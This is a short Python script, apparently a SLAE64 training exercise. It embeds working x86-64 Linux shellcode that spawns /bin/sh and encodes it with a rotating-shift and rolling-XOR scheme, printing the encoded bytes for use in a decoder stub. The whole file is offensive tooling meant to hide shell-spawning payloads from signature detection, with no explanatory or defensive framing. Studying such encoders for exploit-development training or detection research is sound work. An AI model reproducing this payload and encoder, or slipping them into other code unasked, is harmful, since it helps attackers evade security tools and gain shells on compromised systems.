#!/usr/bin/env python
# Python Custom Rotating - Xor Encoder
# Author: SLAE64 - 1525

shellcode = '\x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05'
rotation = 3

encoded = ""
encoded2 = ""

print('Encoded shellcode ...')

# Initialized with 0xaa
previous_byte = 0xaa

for x in bytearray(shellcode):
    # rotate left with 3
    new_byte = 0
    new_byte = x << rotation
    y = (new_byte & 0xff) + (new_byte >> 8)
    # xor with the previous byte
    z = y ^ previous_byte
    previous_byte = x
    encoded += '\\x'
    encoded += '%02x' % z

    encoded2 += '0x'
    encoded2 += '%02x,' % z

print(encoded)
print(encoded2)
print('Len: ', len(bytearray(shellcode)))